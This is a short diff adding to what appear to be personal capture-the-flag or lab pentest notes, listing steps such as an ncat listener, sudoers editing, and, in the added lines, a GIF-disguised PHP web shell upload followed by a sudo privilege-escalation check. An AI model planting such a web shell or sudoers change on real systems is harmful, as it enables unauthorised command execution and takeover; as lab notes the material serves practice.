@@ -183,5 +183,10 @@ ncat -lvnp 9001 > backup.7z
   intercept using wireshark
   check openssl by gtfobin
   check /etc/sudoers, add owned user and local ip
+
+# Networked Machine:
+  upload file, lead to commmand injection (GIF8;<?php system($_GET['Balabala']); ?>
+  give touch argument, sudo -l
+  
     
   
